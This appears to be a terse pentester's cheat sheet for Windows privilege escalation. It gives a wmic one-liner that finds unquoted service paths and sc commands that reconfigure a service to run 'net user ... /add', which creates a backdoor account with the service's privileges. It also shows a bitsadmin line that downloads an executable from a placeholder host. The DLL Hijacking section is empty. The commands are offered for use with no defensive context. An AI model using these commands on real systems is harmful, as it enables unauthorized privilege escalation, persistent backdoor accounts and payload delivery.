# Windows Privilege Escalation

### Unquoted Services
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

```
sc config "service" binpath= "net user username password /add"
sc stop "service"
sc start "service"
```
### DLL Hijacking


### Bitsadmin
```
bitsadmin /transfer job /download /priority normal http://<host>/filename.exe C:\\<directory>\\<directory>\\filename.exe
```
